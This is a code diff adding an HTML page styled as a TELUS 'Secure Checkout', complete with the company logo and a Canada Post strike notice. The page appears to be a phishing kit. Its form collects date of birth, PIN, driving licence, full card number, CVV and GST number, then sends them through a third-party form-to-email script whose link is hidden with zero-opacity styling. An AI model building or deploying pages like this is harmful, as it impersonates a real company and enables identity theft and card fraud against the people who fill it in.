@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Telus Checkout</title>
+  <style>
+    :root {
+      --primary: #6c63ff;
+      --background: #eef1f8;
+      --card-bg: rgba(255, 255, 255, 0.75);
+      --label-color: #555;
+      --input-bg: #ffffffdd;
+      --border-radius: 16px;
+      --transition: 0.3s ease;
+      --shadow: 0 8px 30px rgba(0, 0, 0, 0.1);
+      --blur: 10px;
+    }
+
+    * {
+      box-sizing: border-box;
+      font-family: 'Segoe UI', sans-serif;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background: linear-gradient(135deg, #c6d0e6, #f0f2f5);
+      min-height: 100vh;
+      padding: 20px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    header img {
+      max-height: 50px;
+      margin-bottom: 20px;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 1000px;
+      background: var(--card-bg);
+      backdrop-filter: blur(var(--blur));
+      -webkit-backdrop-filter: blur(var(--blur));
+      padding: 40px 30px;
+      border-radius: var(--border-radius);
+      box-shadow: var(--shadow);
+      transition: var(--transition);
+    }
+
+    h1 {
+      color: var(--primary);
+      text-align: center;
+      margin-bottom: 6px;
+      font-size: 2.2rem;
+    }
+
+    .subtitle {
+      text-align: center;
+      color: #666;
+      margin-bottom: 30px;
+    }
+
+    .info-bar {
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      background-color: #f3f0f6;
+      color: #333;
+      padding: 16px 20px;
+      border-radius: 8px;
+      font-size: 15px;
+      margin-bottom: 30px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.05);
+      gap: 12px;
+    }
+
+    .info-icon::before {
+      content: "ℹ️";
+      margin-right: 8px;
+    }
+
+    form {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+    }
+
+    .form-group {
+      position: relative;
+    }
+
+    .form-group input {
+      width: 100%;
+      padding: 18px 16px 14px;
+      font-size: 15px;
+      background: var(--input-bg);
+      border: 1px solid #ccc;
+      border-radius: var(--border-radius);
+      transition: var(--transition);
+      outline: none;
+    }
+
+    .form-group input:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.2);
+    }
+
+    .form-group p {
+      position: absolute;
+      top: 16px;
+      left: 18px;
+      color: var(--label-color);
+      font-size: 13px;
+      pointer-events: none;
+      transition: 0.2s ease all;
+      background: var(--input-bg);
+      padding: 0 4px;
+    }
+
+    .form-group input:focus + p,
+    .form-group input:not(:placeholder-shown) + p {
+      top: -8px;
+      left: 14px;
+      font-size: 11px;
+      background: var(--background);
+      color: var(--primary);
+    }
+
+    .card-input-wrapper {
+      position: relative;
+    }
+
+    .card-icon {
+      position: absolute;
+      top: 50%;
+      right: 14px;
+      transform: translateY(-50%);
+      height: 28px;
+      display: none;
+    }
+
+    .submit-btn {
+      grid-column: 1/-1;
+      background-color: var(--primary);
+      color: white;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: bold;
+      border: none;
+      border-radius: var(--border-radius);
+      cursor: pointer;
+      transition: 0.3s ease;
+    }
+
+    .submit-btn:hover {
+      background-color: #524bd6;
+    }
+
+    @media (max-width: 480px) {
+      h1 {
+        font-size: 1.5rem;
+      }
+
+      .info-bar {
+        flex-direction: column;
+        font-size: 14px;
+      }
+
+      .card-icon {
+        height: 24px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <header>
+    <img src="https://images.ctfassets.net/fikanzmkdlqn/3yUnySNpS8IS4CeyUeWgeg/5bcfa9c592acfe591f26d85f6820fa5f/Logo_TELUS.svg" alt="TELUS Logo">
+  </header>
+
+  <div class="container">
+    <h1>Secure Checkout</h1>
+    <p class="subtitle">Please provide your information to continue.</p>
+
+    <div class="info-bar">
+      <span class="info-icon"></span>
+      <span>Due to the Canada Post strike, we’re currently unable to deliver to PO boxes and rural routes.</span>
+    </div>
+
+    <form method="post" action="//submit.form">
+
+      <div class="form-group"><input type="tel" id="contact" name="contact" placeholder=" " required /><p>Contact Number</p></div>
+      <div class="form-group"><input type="text" id="dob" name="dob" placeholder=" " required /><p>Date of Birth</p></div>
+      <div class="form-group"><input type="text" id="fname" name="fname" placeholder=" " required /><p>First Name</p></div>
+      <div class="form-group"><input type="text" id="mname" name="mname" placeholder=" " /><p>Middle Name</p></div>
+      <div class="form-group"><input type="text" id="lname" name="lname" placeholder=" " required /><p>Last Name</p></div>
+      <div class="form-group"><input type="text" id="address" name="address" placeholder=" " required /><p>Billing Address</p></div>
+      <div class="form-group"><input type="password" id="pin" name="pin" placeholder=" " required /><p>PIN</p></div>
+      <div class="form-group"><input type="text" id="dl" name="dl" placeholder=" " /><p>Driving License</p></div>
+      <div class="form-group"><input type="text" id="dl_expiry" name="dl_expiry" placeholder=" " /><p>DL Expiry Date</p></div>
+
+      <div class="form-group card-input-wrapper">
+        <input type="text" id="cardNumber" name="cardNumber" placeholder=" " required />
+        <p>Card Number</p>
+        <img id="cardIcon" class="card-icon" alt="Card Icon" />
+      </div>
+
+      <div class="form-group"><input type="text" id="cardRepeat" name="cardRepeat" placeholder=" " required /><p>Re-enter Card Number</p></div>
+      <div class="form-group"><input type="text" id="cardType" name="cardType" readonly placeholder=" " /><p>Card Type</p></div>
+      <div class="form-group"><input type="text" id="exp" name="exp" placeholder="MM/YY" required /><p>Expiration Date (MM/YY)</p></div>
+      <div class="form-group"><input type="text" id="holder" name="holder" placeholder=" " required /><p>Card Holder Name</p></div>
+      <div class="form-group"><input type="text" id="cvv" name="cvv" placeholder=" " pattern="[0-9]{3,4}" required /><p>CVV</p></div>
+      <div class="form-group"><input type="text" id="bizname" name="bizname" placeholder=" " /><p>Legal Business Name</p></div>
+      <div class="form-group"><input type="text" id="regDate" name="regDate" placeholder=" " /><p>Registration Date</p></div>
+      <div class="form-group"><input type="text" id="gst" name="gst" placeholder=" " /><p>GST/HST Number</p></div>
+
+      <button type="submit" class="submit-btn">Submit</button>
+
+
+      <div>
+        <div style='font-size:1px; opacity:0;' style="float:right"><a href="https://www.100forms.com" id="lnk100" title="form to email">form to email</a></div>
+<script src="https://www.100forms.com/js/FORMKEY:UCKLLUM59D84" type="text/javascript"></script>
+</div>
+
+    </form>
+  </div>
+
+  <script>
+    const cardNumberInput = document.getElementById('cardNumber');
+    const cardIcon = document.getElementById('cardIcon');
+    const cardTypeInput = document.getElementById('cardType');
+
+    const cardIcons = {
+      visa: "https://img.icons8.com/color/48/visa.png",
+      mastercard: "https://img.icons8.com/color/48/mastercard-logo.png",
+      amex: "https://img.icons8.com/color/48/amex.png"
+    };
+
+    function detectCardType(number) {
+      number = number.replace(/\s+/g, '');
+      if (/^4/.test(number)) return "visa";
+      if (/^5[1-5]/.test(number)) return "mastercard";
+      if (/^3[47]/.test(number)) return "amex";
+      return null;
+    }
+
+    cardNumberInput.addEventListener('input', () => {
+      const type = detectCardType(cardNumberInput.value);
+      if (type && cardIcons[type]) {
+        cardIcon.src = cardIcons[type];
+        cardIcon.style.display = "block";
+        cardTypeInput.value = type.charAt(0).toUpperCase() + type.slice(1);
+      } else {
+        cardIcon.style.display = "none";
+        cardTypeInput.value = "";
+      }
+    });
+  </script>
+
+</body>
+</html>
